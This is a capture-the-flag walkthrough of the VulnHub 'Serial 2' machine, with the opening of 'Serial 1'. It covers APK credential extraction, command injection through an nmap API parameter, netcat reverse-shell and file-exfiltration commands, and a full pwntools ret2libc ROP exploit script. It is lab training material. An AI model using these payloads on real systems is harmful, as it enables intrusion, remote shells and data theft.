<p>Format: <code>gobuster dir WORDLIST -u VMIP</code></p>
<p><img src="/Serial_2/2020-05-09-213611_1920x1080_scrot.png" alt="&ldquo;gobuster&rdquo;">
<em>Output of gobuster.</em></p>
<p>Since all endpoints return a 200 response, we try to find the ones that return 301, 401.</p>
<p><img src="/Serial_2/1_image.png" alt="&ldquo;gobuster_2&rdquo;">
<em>Output of gobuster.</em></p>
<p>The <code>/api</code> endpoint seems to standout.</p>
<h3 id="manual-discovery">Manual Discovery</h3>
<p>We visit the IP. It&rsquo;s a website promoting a new mobile application. Poking around the website, I found that the Play Store reference downloads a file named <strong>serial2.apk</strong>.</p>
<p><img src="/Serial_2/jc93_Dp_WstfoFJ-4FFd-BtCwrO3HY5lAtiW2lm2ZyKrCF9zVnrp3vo30kPgTGML7HRORT7M8RksGHv6f3HWPV7UbVXDNcpQJHYnC8XXls5hCnNLtM6TV7ewOi6Ffp-eUIsFrOUMXq07JNJNZQ.png" alt="&ldquo;download&rdquo;">
<em>Clicking on the box downloads an APK.</em></p>
<p>Further, several endpoints have been listed on the website. The <code>/api</code> discovered earlier has further endpoints.</p>
<p><img src="/Serial_2/P2M-9D6rDzVmsPHrfwxbCWpB3mbKqjqIEwPhxN3yZmSZO0bqDY-ShZ9vuTySTyIsr3m149xKFyOI0LgfGGV0lA9rLtt_c_IzLTm2EKmZwQLHicayW2QCYVzRWdcGeHz9Sxd-uzhORs-xn_afrQ.dat" alt="&ldquo;api&rdquo;">
<em>Listed endpoints.</em></p>
<h1 id="hunting-begins">Hunting begins</h1>
<p>Let&rsquo;s checkout the weird service running on port 10000 first.</p>
<p>Run <code>telnet 192.168.1.10 10000</code></p>
<p>Format: <code>telnet VMIP 10000</code></p>
<p><img src="/Serial_2/2_image.png" alt="&ldquo;telnet&rdquo;">
<em>Output of telnet.</em></p>
<p>This service logs us in as the root user(since it&rsquo;s asking for the root user&rsquo;s password). As we do not have the root password yet, this is a dead end for now.</p>
<p>I then tried to connect to the endpoints mentioned on the webpage by making a <code>GET</code> request to <code>VMIP</code>, and received a response with a status code <code>401 Unauthorized</code>.</p>
<p><img src="/Serial_2/image.png" alt="&ldquo;unauth&rdquo;">
<em>Response status code Unauthorized.</em></p>
<p>I tried installing the apk on an <strong>AVD</strong>(<strong>Android Virtual Device</strong>) hosted via Genymotion. It failed.</p>
<p><img src="/Serial_2/L8-AhnXR_gool12Me8legOhPNnCM5XLGtQeLeutFX8edQd4QUBltzunAysJj_XnTKJeqN5cU7Bk-oGpDCMglEWgqa7FbYAwsV6q3XPUTZoP4dRvVRXk6KnCLHJPiZdPPhVxl4k-BiSRMprpH1Q.png" alt="&ldquo;avd&rdquo;">
<em>Failed installation on Genymotion AVD.</em></p>
<p>Alright then, we spin up JADX and reverse the apk.</p>
<p>Instinctively jumping to <code>Resources/resources.arsc/res/values/strings.xml</code>, I found a string token named <code>basic_auth</code>.</p>
<p><img src="/Serial_2/iB8ei9LOtdAVHXVOZ02R44hDg3H8-uDdN-tEUrtXKWXMd7bDADV6kti3eBVCN7BwVqbwxFakXwLUTPBtlQfiUzu95F5W8u8HQbYoFiNuDFfX3TY6X-wcTaBXm69pBpIlCUh3ASrtYRhdKX1zZw.png" alt="&ldquo;jadx&rdquo;">
<em>strings.xml file of the apk.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;c2s0OmJKNiErbSUqJF0jeDc9TEE=&#34;</span>))
</code></pre></div><p><code>sk4:bJ6!+m%*$]#x7=LA</code></p>
<p>We open postman to make a request to the endpoints we found on the website earlier, and try to use this decoded value as auth credentials.</p>
<p>We choose the authentication type as Basic Auth and enter:</p>
<p>Username: <code>sk4</code></p>
<p>Password: <code>bJ6!+m%*$]#x7=LA</code></p>
<p><img src="/Serial_2/l17DusDGH3kYb53rmjt7ks_KGstttN22t0oNq2uiDXfKBG1xLEPhxWpl1v1fhpdBfBlWAEk8H261mFg8HN9uLYsZ8dJ8qYovjOjP7AYiXIMRbfxfIlu55_--SFxHuYdNsPhX8afyKTMYC_mA7Q.dat" alt="&ldquo;basic_auth&rdquo;">
<em>Request using credentials.</em></p>
<p>Voilà! We receive a response with status code <code>200 OK</code>.</p>
<p>Now, we provide the required parameter (as indicated in the response message). Moreover, piping outputs from commands into nmap is a fairly common technique used in automated recon scripts, bash jail escapes and creating vim shortcuts.</p>
<p><code>GET</code> request to <code>192.168.1.10/api/nmap?ip=127.0.0.1 | ls -la</code></p>
<p>Format: <code>VMIP/api/nmap?ip=127.0.0.1 | ls -la</code></p>
<p><img src="/Serial_2/uWwZIgawjVLXcTsItWyc46X8Y7CFF-fYQFEok2dQkem6GTlJk9aEvFQK0WAnBPM8MZs3f1nmNuwjDmsgjcMuPj5IJpzpalFrLaSMPqgmipBiI_ig7htTX243hwcWQnwMQEC53YuYnurwNdI9hg.dat" alt="&ldquo;command_exec&rdquo;">
<em>Command execution verified.</em></p>
<p>Thereafter, we try to spawn a reverse shell.</p>
<p>Start a listener on the host machine.</p>
<p>Run <code>nc -nlvp 4444</code></p>
<p>Format: <code>nc -nlvp PORT</code></p>
<p>And then try to connect to this listener via the VM.</p>
<p>Run <code>192.168.1.10/api/nmap?ip=127.0.0.1 | nc 192.168.1.6 4444 -e /bin/sh</code></p>
<p>Format: <code>VMIP/api/nmap?ip=127.0.0.1 | nc LHIP PORT -e /bin/sh</code></p>
<p><img src="/Serial_2/Xq0aYQaGvXO8jBa4xXmRspLTKx6YJeKGaIhThPPFtJxp6QZ7sZwo-9p6u3JDKeaa1cV4GSmXytyV87O5oF3l63ZQPdFTE68_LjY_kn2WP5BJHMDOmbHB5gA50eJcMUxa9InNUlPPK-_WZ7_A5A.dat" alt="&ldquo;local_listener&rdquo;">
<em>Listener on local host.</em></p>
<p><img src="/Serial_2/J3p_t5lO-DvxtiRC4h2PAqcOca6TiULuaN2FHy3hfnwx4mqPoN4x2OrboYDqitRAgR1mLV0uZNAhu8UBod6gPWDDybCvgdkqA0qBPeRITsDiqYq6V-IQYBGD1Sp_lk-GEGHVNGFkbj66npXCSA.dat" alt="&ldquo;connect_listener&rdquo;">
<em>Connect to the listener.</em></p>
<p>We pack everything inside the VM and fetch it to our local host for further analysis.</p>
<p>Run <code>tar -czvf serial2.tar.gz *</code></p>
<p>Format: <code>tar -czvf FILE *</code></p>
<p><img src="/Serial_2/ZUShaAIjtmAsWKoEkpd5v6S1LTLj1F68LzCvxeqhoV9fPPfyjzcN-78l_I4Ts3oQb_KLpfZlWYvBicOC4FvVkTL5nA-W9toTO87va8dfg5FFyQd_q4S28I3C5eYZg8eJ8aVdAUCw.png" alt="&ldquo;tar&rdquo;">
<em>tar all contents.</em></p>
<p>Start a new listener on a different port and redirect all the data received on it into a file.</p>
<p>Run <code>nc -nlvp 1337 &gt; serial2.tar.gz</code></p>
<p>Format: <code>nc -nlvp NewPORT &gt; FILENAME</code></p>
<p><img src="/Serial_2/GUTZ4WnglKqrfCZbvBsDQZNhX-kDwOemheRlfVMKmETVgOB6bGIYsF4Do4OnNYV5fQ_jIbOe0ohaAC37WWpRUTGAnarRMe9QIVNiaPWuxqEoPl5gJvMORm2Z1oeQTOflUN_5FnsccRuMf5AW8A.dat" alt="&ldquo;local_listener&rdquo;">
<em>Pipe all input from the listener to file.</em></p>
<p>Pipe all bytes from the file into the listener.</p>
<p>Run <code>cat serial2.tar.gz | nc 192.168.1.6 1337</code></p>
<p>Format: <code>cat FILE | nc LHIP NewPORT</code></p>
<p><img src="/Serial_2/s8HdLB48dPURowb5aSbZkWXSWhnp9ZsG98jCJupqefo1qqezBX21XlMdLmI5f4VB92RLPYYc2nWd4J31-fiHzF8hAL9BqJRMbHU_iKGGgT-JMCd0uQHAz5s_X7rVvW201c-vUa6woPIkZcNLVA.png" alt="&ldquo;connect_listener&rdquo;">
<em>Send all bytes of the file to the listener.</em></p>
<p>Exploring all the files, we spot a .git folder.</p>
<p>Instinctively, we check the git log.</p>
<p>Run <code>git log</code></p>
<p><img src="/Serial_2/Epy59D1WxRBj_CWmWz2fAL41lpbsrt1nt6tWpEXlw-qbT4hh_wrlDBK8CZwjgE4hrnxAbqaaCteI8LxWsX3l-MoYalO1J9MCfMciZyQf2C_YcbZkOGsHBIA0W4UYDj6q4jiE9Ddu9jzqbneYTQ.png" alt="&ldquo;git_log&rdquo;">
<em>Output of git log.</em></p>
<p>The commit message straight up implies that some keys have been removed.</p>
<p>We therefore check the state of the files before this commit. This means rolling back to the previous commit.</p>
<p>Run <code>git checkout b039a4207810e47cde90db811661217af2bc67c3</code></p>
<p><img src="/Serial_2/C2GCkwoXPhPVpC0H24HrAexqs_ubqs7_UaRff_Vhg07KaAyRaHKgWajajasXE1804ytCpQDW7JtbRuQSg0hrjq5v7yh9KmKLUrIu9t06WCYQz4o2VvJPFHfeYXrrtU7DsIMGQJnIgnULPVx1uw.dat" alt="&ldquo;git_checkout&rdquo;">
<em>Rolling back to the commit whose hash was specified.</em></p>
<p>Looking around, I spot a RSA keypair.</p>
<p><img src="/Serial_2/miV283IclOl-rWur5f2jWFnIzW2pD2vFw4deSXHu8SOiSylfqU1mwIIlj1ZStiMtBI1pmgqAwDlVmMu4u6XZ5UJbH-hJwdJoXcPhcp8gkd8OvQVbaNrDyZFn-KFGbA0firobBZV2C3j7LUlnWA.dat" alt="&ldquo;rsa_keypair&rdquo;">
<em>RSA keypair spotted.</em></p>
<p>We can use this private key to connect to the SSH service running on the VM.</p>
<p><img src="/Serial_2/XjMmGS3OaORnF9CCOzVC2ULTe6eACS-kDCb76GpiAlzLLzcGs3_3c131QChhDA42M0eWHKstymG-vjwNiL7X1hYpD9IeLxxqcjx7u_bY8_yeu4n9gEvJOwlunq0_fTPHqSnGo9Qf-HRDTtis7w.dat" alt="&ldquo;bad_permissions&rdquo;">
<em>A bad permissions error is shown.</em></p>
<p>A bad permission error is thrown. This is because the key does not have appropriate permissions.</p>
<p>Run <code>chmod 0600 id_rsa</code></p>
<p><img src="/Serial_2/lahZm8F34fGKorE7zH17KJQHsdKvpNPB82hOmzLQKqmyjoBF-VqT2rEcSOOQS3ijnGcAOv3TfP_Devbe6opjBUb-FWH3Az-bzFz9bAj5UQKgquiGGYdO8r3GC5-8mok5u7rXxh_lnGvlwXFFrw.dat" alt="&ldquo;chmod&rdquo;">
<em>Modifying permissions of the key.</em></p>
<p>This time the connection attempt is successful.</p>
<p><img src="/Serial_2/-rFLRB8gbOfs3hGSOdfKceCuB1pkbI5iDmnTSGlIOKAQsuNi7NNGkCyiWs4p8_vJo_mHR7RKrXXyQcixm9tPKRZA--JxmZG7ktfRnPT5fL48yuTqKNWpAF6wR55nC4UxeuIq7uzyPM3fwvsXfw.dat" alt="&ldquo;connect_success&rdquo;">
<em>SSH connected.</em></p>
<p>Run <code>ls -la</code></p>
<p><img src="/Serial_2/5jFaFA8pi8B_7f90fPCpxjby7v-hDW56BZYu1SABYdmHJh2Tv3dJtY-VaD4nxA0mcqkZgf9cBGcNEe7wDIS9I0fKA-FstwqZrmNJgl-Trgc_UvKXHtYAcKJidIOloNF4OEhe-Oa4i9IriuAL9g.dat" alt="&ldquo;ls&rdquo;">
<em>flag.txt can be seen.</em></p>
<p>Run <code>cat flag.txt</code></p>
<p><img src="/Serial_2/aYqY6XNq15cVNRvFkhxyIcmHjhGye39-EHYnfeIvHEUgVGpV5Jp5DnJxnOGYJztofABMp-4YEKN0PT-WkM3TPUbRwSCuh9QkMKuk2uxhoK3NViVSqKVAdCMr6dMpVXJ9f2uR8QB0MUQscWCdNw.dat" alt="&ldquo;flag&rdquo;">
<em>flag,txt</em></p>
<p>We got our first flag. This must be the user flag since we are logged in as <code>sk4</code>.</p>
<p>The service running on port 10000 was asking for the root user&rsquo;s password. Since it definitely would be running some sort of a check on the password entered, let&rsquo;s try and find the binary served on the port and see if we can something in it.</p>
<p>Run <code>netstat -tulpn | grep :10000</code></p>
<p>It displays all the connections, and the corresponding information.</p>
<p><img src="/Serial_2/3_image.png" alt="&ldquo;netstat&rdquo;">
<em>Output of netstat.</em></p>
<p>The service is most probably being run by root.</p>
<p>I took the approach of hit and trial trying to find files using the words printed on the terminal before it asks for a password.</p>
<p>I got a hit with the word <strong>backd00r</strong>.</p>
<p>Run <code>find / -name backd00r</code></p>
<p>Format: <code>find / -name WORD</code></p>
<p><img src="/Serial_2/4_image.png" alt="&ldquo;backd00r&rdquo;">
<em>File found named backd00r.</em></p>
<p>I executed it once to verify that it is indeed the binary being served on port 10000.</p>
<p>Fetch it to local host for further analysis, just like we did with the tar of all files earlier.</p>
<p>Start a new listener and redirect all the data received on it into a file.</p>
<p>Run <code>nc -nlvp 1337 &gt; backd00r</code></p>
<p>Format: <code>nc -nlvp PORT &gt; BINARYNAME</code></p>
<p><img src="/Serial_2/5_image.png" alt="&ldquo;local_listener&rdquo;">
<em>Pipe all input from the listener to file.</em></p>
<p>Pipe all bytes from the file into the listener.</p>
<p>Run <code>cat /bin/backd00r | nc 192.168.1.6 1337</code></p>
<p>Format: <code>cat /bin/backd00r | nc LHIP PORT</code></p>
<p><img src="/Serial_2/6_image.png" alt="&ldquo;connect_listener&rdquo;">
<em>Send all bytes of the file to the listener.</em></p>
<p>Run <code>chmod +x backd00r</code> to give the binary execution permissions.</p>
<p>We run a strings on the binary.</p>
<p>Run <code>strings backd00r</code></p>
<p>Format: <code>strings BINARYNAME</code></p>
<p><img src="/Serial_2/7_image.png" alt="&ldquo;strings&rdquo;">
<em>Output of strings.</em></p>
<blockquote>
<p><a href="mailto:root@serial2.vulnab">root@serial2.vulnab</a>&rsquo;s password:</p>
<p>j&amp;9GCS34MY+^4ud*</p>
</blockquote>
<p>It indicates that the following string is root password. So we make another attempt to login to the service using this password.</p>
<p>We then try and execute the binary from the user shell.</p>
<p><img src="/Serial_2/15_image.png" alt="&ldquo;root&rdquo;">
<em>Obtained root shell.</em></p>
<p>The password is validated and we get the root shell. However, it does not allow us to read the <code>flag.txt</code> file. The shell is clearly a restricted one.</p>
<p>Similar thing happens when I try this tactic via the service on port 10000 from local host. Clearly there&rsquo;s more to the binary than we initially thought.</p>
<p>We are now getting into the arena of binary exploitation. You could just skip ahead to the end and use the given script to pwn the service if you do not want to get into this section.</p>
<h1 id="binary-exploitation">Binary Exploitation</h1>
<p>We open the binary in IDA.</p>
<p>The binary is short and sweet, and there&rsquo;s not much to it.</p>
<p><img src="/Serial_2/10_image.png" alt="&ldquo;main&rdquo;">
<em>The &ldquo;main&rdquo; function of the binary.</em></p>
<p>We take a look at the <em>login</em> function here, since root password is all we desire. </p>
<p><img src="/Serial_2/17_image.png" alt="&ldquo;login&rdquo;">
<em>The &ldquo;login&rdquo; function of the binary.</em></p>
<p>It turns out that the string we found indeed is the value against which are input is verified, though we still don&rsquo;t know if it is the root password. We therefore try to escalate to the root user via the shell of user <strong>sk4</strong>.</p>
<p><img src="/Serial_2/11_image.png" alt="&ldquo;auth_fail&rdquo;">
<em>Root user auth failure.</em></p>
<p>But to no avail. It&rsquo;s settled then, the string we had found isn&rsquo;t the root user&rsquo;s password.</p>
<p>Looking around in the <em>loop</em> function, I realise that the prompt we are presented with after entering the password is not that of a shell at all, it&rsquo;s just a case riddled input.</p>
<p><img src="/Serial_2/13_image.png" alt="&ldquo;loop&rdquo;">
<em>The &ldquo;loop&rdquo; function of the binary.</em></p>
<p>We need to pwn the binary.</p>
<p>We analyse the binary using GDB-Peda.</p>
<p><img src="/Serial_2/18_image.png" alt="&ldquo;checksec&rdquo;">
<em>Checking security measures applied on the binary.</em></p>
<p>Clearly this binary is open to the existence of buffer overflow and GOT overwrite vulnerabilities. The binary is not a PIE binary, however the system is expected to have ASLR enabled. Since NX is enabled, we cannot push a shellcode on the stack. Rather, we would have to build a ROP chain for arbitrary code execution.</p>
<p>This can be confirmed by checking the value in the file <strong>/proc/sys/kernel/randomize_va_space</strong>.</p>
<p>Run <code>cat /proc/sys/kernel/randomize_va_space</code></p>
<p><img src="/Serial_2/19_image.png" alt="&ldquo;aslr&rdquo;">
<em>ASLR enabled.</em></p>
<p>Since PIE is_ disabled, only the base address of <code>libc</code> will be randomised, while the base address of the binary will remain constant. And since the offset of different sections of the binary are constant, we can find the address of a frequently occuring function like <code>puts</code> or <code>gets</code> in the <code>plt section</code> and use it to leak the address of <code>libc</code>. The library is in **/lib/x86_64-linux-gnu/** in modern 64-bit standard distributions by default.</p>
<p>Start a new listener and redirect all the data received on it into a file.</p>
<p>Run <code>nc -nlvp 1337 &gt; libc.so.6</code></p>
<p>Format: <code>nc -nlvp PORT &gt; LIBNAME</code></p>
<p><img src="/Serial_2/21_image.png" alt="&ldquo;local_listener&rdquo;">
<em>Pipe all input from the listener to file.</em></p>
<p>Pipe all bytes from the file into the listener.</p>
<p>Run <code>cat /lib/x86_64-linux-gnu/libc.so.6 | nc 192.168.1.6 1337</code></p>
<p>Format: <code>cat /lib/x86_64-linux-gnu/libc.so.6 | nc LHIP PORT</code></p>
<p><img src="/Serial_2/22_image.png" alt="&ldquo;connect_listener&rdquo;">
<em>Send all bytes of the file to the listener.</em></p>
<p>Set the <strong>LD_LIBRARY_PATH</strong> environment variable to the path of this library to ensure that the binary uses this particular libc.</p>
<p>Analysing the binary, I found a buffer overflow vulnerability.</p>
<p><img src="/Serial_2/16_image.png" alt="&ldquo;loop&rdquo;">
<em>Buffer overflow vulnerability in the &ldquo;loop&rdquo; function of the binary.</em></p>
<p>Playing with the input, I was able to cause a SIGSEGV through instruction pointer corruption.</p>
<p><img src="/Serial_2/20_image.png" alt="&ldquo;sigsegv&rdquo;">
<em>SIGSEGV encountered.</em></p>
<p>The value stored in the instruction pointer at the time of the error is compared against the input provided, and it is found that the input buffer is only 72 bytes far from the saved return address on stack.</p>
<p>We use the <strong>pwntools</strong> library to build our exploit script.</p>
<p>Finding the relevant addresses:</p>
<p>Run  <code>objdump -d -M intel backd00r | grep puts</code></p>
<p><img src="/Serial_2/23_image.png" alt="&ldquo;puts&rdquo;">
<em>Address of puts@plt.</em></p>
<p>Run <code>readelf -r backd00r | grep puts</code></p>
<p><img src="/Serial_2/25_image.png" alt="&ldquo;puts_libc&rdquo;">
<em>Address of puts in libc.</em></p>
<p>Run <code>ropper --file backd00r --search &quot;pop rdi&quot;</code></p>
<p><img src="/Serial_2/26_image.png" alt="&ldquo;gadget&rdquo;">
<em>Address of gadget.</em></p>
<p>Following is the final script used to exploit the service:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>, checksec <span style="color:#f92672">=</span> False)

offset_binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
offset_puts <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
offset_system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]

address_gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400bb3</span>

got_puts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x602018</span>
plt_puts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005c0</span>
loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4009c9</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(r):
    pause()
    <span style="color:#75715e"># Pass the password check to reach the prompt.</span>
    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;vulnab&#39;s password: &#34;</span>)
    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;j&amp;9GCS34MY+^4ud*&#34;</span>)
    response <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()
    <span style="color:#66d9ef">while</span> <span style="color:#e6db74">&#34;password: Permission denied&#34;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>):
        r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;j&amp;9GCS34MY+^4ud*&#34;</span>)
        response <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()

    <span style="color:#75715e"># To cause buffer overflow right up till the return address on stack.</span>
    <span style="color:#75715e"># Then form a ROP chain.</span>
    junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">72</span>
    chain <span style="color:#f92672">=</span> junk
    chain <span style="color:#f92672">+=</span> p64(address_gadget)
    chain <span style="color:#f92672">+=</span> p64(got_puts)
    chain <span style="color:#f92672">+=</span> p64(plt_puts)
    chain <span style="color:#f92672">+=</span> p64(loop)
    r<span style="color:#f92672">.</span>sendline(chain)
    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())

    <span style="color:#75715e"># Giving the exit command would cause this function to return, thus transferring</span>
    <span style="color:#75715e"># control our ROP chain.</span>
    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;exit&#34;</span>)

    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())

    <span style="color:#75715e"># The last line received contains the leaked address.</span>
    <span style="color:#75715e"># We take out the first 8 bytes, i.e. the base address.</span>
    leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(False)[:<span style="color:#ae81ff">8</span>]
    leak <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(leak))
    puts <span style="color:#f92672">=</span> u64(leak)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Leaked &#39;puts&#39; address: &#34;</span>, hex(puts))
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&#39;puts&#39; offset: &#34;</span>, hex(offset_puts))
    libc_base <span style="color:#f92672">=</span> puts <span style="color:#f92672">-</span> offset_puts
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;libc base address: &#34;</span>, hex(libc_base))

    <span style="color:#75715e"># We create a new ROP chain to get the shell.</span>
    chain <span style="color:#f92672">=</span> junk
    chain <span style="color:#f92672">+=</span> p64(address_gadget)
    chain <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> offset_binsh)
    chain <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> offset_system)
    chain <span style="color:#f92672">+=</span> p64(address_gadget)
    chain <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> offset_binsh)
    chain <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> offset_system)
    r<span style="color:#f92672">.</span>sendline(chain)

    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;exit&#34;</span>)
    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
    r<span style="color:#f92672">.</span>interactive()

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;192.168.1.10&#34;</span>, <span style="color:#ae81ff">10000</span>)
    exploit(r)
</code></pre></div><p><img src="/Serial_2/27_image.png" alt="&ldquo;pwned&rdquo;">
<em>Root flag.</em></p>
]]></content>
        </item>
        
        <item>
            <title>Serial 1</title>
            <link>https://hexterisk.github.io/blog/posts/2020/05/08/serial-1/</link>
            <pubDate>Fri, 08 May 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/05/08/serial-1/</guid>
            <description>Name: serial: 1 Date release: 20 Aug 2019 Author: sk4 Series: serial  Initial Discovery VMIP is the VM’s IP Address
LHIP is the Local Host’s IP Address
Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
IP Discovery Run sudo netdiscover.
It detects online hosts by sending ARP requests.
Output of netdiscover.
192.168.1.8 happens to be the IP of the VM.</description>
            <content type="html"><![CDATA[<ul>
<li><strong>Name</strong>: <a href="https://www.vulnhub.com/entry/serial-1,349/">serial: 1</a></li>
<li><strong>Date release</strong>: 20 Aug 2019</li>
<li><strong>Author</strong>: <a href="https://www.vulnhub.com/author/sk4,633/">sk4</a></li>
<li><strong>Series</strong>: <a href="https://www.vulnhub.com/series/serial,231/">serial</a></li>
</ul>
<h1 id="initial-discovery">Initial Discovery</h1>
<p><code>VMIP</code> is the VM’s IP Address</p>
<p><code>LHIP</code> is the Local Host’s IP Address</p>
<p>Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.<br>
 </p>
<h3 id="ip-discovery">IP Discovery</h3>
<p>Run <code>sudo netdiscover</code>.</p>
<p>It detects online hosts by sending ARP requests.</p>
<p><img src="/Serial_1/1_image.png" alt="&ldquo;netdiscover&rdquo;">
<em>Output of netdiscover.</em></p>
<p>192.168.1.8 happens to be the IP of the VM.</p>
<h3 id="port-discovery">Port Discovery</h3>
<p>Next, we move on to port discovery to find out if there any exposed ports, and their corresponding services.</p>
<p>Run <code>nmap -sC -sV -p- -A 192.168.1.8</code></p>
<p>Format: <code>nmap -sC -sV -p- -A VMIP</code></p>
<p><img src="/Serial_1/2_image.png" alt="&ldquo;nmap&rdquo;">
<em>Output of nmap.</em></p>
<p>Nothing of consequence, although we might attempt connecting to the ssh service if we somehow get hold of the credentials.</p>
<h3 id="directory-discovery">Directory Discovery</h3>
<p>Attempting to enumerate through all the endpoints.</p>
<p>Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt">common.txt</a> wordlist.</p>
<p><img src="/Serial_1/3_image.png" alt="&ldquo;gobuster&rdquo;">
<em>Output of gobuster.</em></p>
<p><code>WORDLIST</code> is the dictionary containing a list of possible endpoints.</p>
<p>Run <code>gobuster dir -w common.txt -u 192.168.1.8</code></p>
<p>Format: <code>gobuster dir -w WORDLIST -u VMIP</code></p>
<p><code>/backup</code> endpoint seems interesting.</p>
<h3 id="manual-discovery">Manual Discovery</h3>
<p>So we visit the homepage.</p>
<p><img src="/Serial_1/16_image.png" alt="&ldquo;home&rdquo;">
<em>Homepage.</em></p>
<p>The word cookie seems to have some significance here. Let’s check out the cookies on the page.</p>
<p><img src="/Serial_1/17_image.png" alt="&ldquo;cookie&rdquo;">
<em>user cookie.</em></p>
<p>A cookie does exists for the user.</p>
<p>Let&rsquo;s checkout the <code>/backup</code> endpoint.</p>
<p><img src="/Serial_1/31_image.png" alt=""/backup&rdquo;">
<em>/backup endpoint.</em></p>
<p>A <strong>bak.zip</strong> is present. Download it and uncompress it.</p>
<p>Run <code>unzip bak.zip</code></p>
<p><img src="/Serial_1/4_image.png" alt="&ldquo;bak&rdquo;">
<em>Files inside bak.zip</em></p>
<p>Analysis of the files is given as follows:</p>
<h5 id="indexphp">index.php</h5>
<p><img src="/Serial_1/6_image.png" alt="&ldquo;index&rdquo;">
<em>index.php</em></p>
<p>We can see that a cookie is formed here, serialized and base64 encoded, based on the username provided.</p>
<p>The default cookie is <code>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0 =</code>.</p>
<p>Base64 decoding the cookie:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0 =&#34;</span>))
</code></pre></div><p><code>O: 4: ”User”: 2: {s: 10: ”Username”; s: 3: ”sk4&quot;; s: 9: ”Userwel”; O: 7: ”Welcome”: 0: {}}</code></p>
<h5 id="userclassphp">user.class.php</h5>
<p><img src="/Serial_1/7_image.png" alt="&ldquo;user.class&rdquo;">
<em>user.class.php</em></p>
<p>The log class file is imported. This could potentially contain a vulnerability for LFI/RFI.</p>
<h5 id="logclassphp">log.class.php</h5>
<p><img src="/Serial_1/8_image.png" alt="&ldquo;log.class&rdquo;">
<em>log.class.php</em></p>
<p>The stray <strong>$type_log</strong> variable could be used to mention files. Other than that, Plain and simple file that executes an echo for the message provided to it.</p>
<h1 id="hunting-begins">Hunting begins</h1>
<p>We add the line <code>echo base64_encode(serialize(new User('admin')));</code> to obtain a cookie with user set as admin.</p>
